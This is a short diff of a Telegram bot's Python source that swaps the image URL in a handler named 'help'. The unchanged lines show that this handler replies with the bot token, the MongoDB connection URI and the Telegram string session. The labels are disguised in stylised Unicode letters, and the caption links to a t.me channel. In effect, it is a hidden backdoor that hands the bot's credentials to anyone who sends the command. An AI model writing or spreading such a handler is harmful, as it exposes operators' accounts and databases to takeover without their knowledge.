@@ -29,7 +29,7 @@ rel = {}
 )
 async def help(client: Client, message: Message):
     await message.reply_photo(
-        photo="https://telegra.ph/file/b61227af05544deb76a34.jpg",
+        photo="https://i.imghippo.com/files/ie1543QQ.jpg",
         caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/huntermafiya)............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
